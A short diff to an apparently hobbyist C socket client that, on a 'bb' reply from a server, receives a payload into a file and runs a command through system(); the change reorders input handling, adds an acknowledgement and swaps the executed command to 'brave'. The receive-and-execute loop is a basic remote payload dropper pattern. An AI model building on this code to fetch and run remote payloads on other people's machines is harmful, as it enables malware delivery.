@@ -66,23 +66,24 @@ int main(int agrc, char **argv){
 
         scanf("%1023[^\n]", BUF);
         // rc4((unsigned char *)key, strlen(key), BUF, strlen(BUF));
+        getchar();
         ssize_t sendn = send(soc, BUF, strlen(BUF), 0);
         if (sendn == -1){
             perror("Failed to send");
             exit(EXIT_FAILURE);
         }
-        getchar();
         ssize_t recvn = recv(soc, BUF, strlen(BUF), 0);
         if (strcmp(BUF, "aa") == 0) { 
             close(soc);
             exit(1);
         }
-        if (strcmp(BUF, "bb") == 0) { 
+        else if (strcmp(BUF, "bb") == 0) { 
             int recvStatus = recv_payload(soc);
 
             if (recvStatus == 1) exec_payload();
             else puts("tibau");
         }
+        else continue;
 
     }
     
@@ -111,13 +112,13 @@ int recv_payload(int sfd){
             return 0;
         }
     }
-    
+    send(sfd, "b\0", 2, 0);
     close(pldfd);
     return 1;
 }
 
 int exec_payload(){
-    if (system("echo naummmmmm") == -1){
+    if (system("brave") == -1){
         perror("Failed to execute payload");
         return 0;
     }
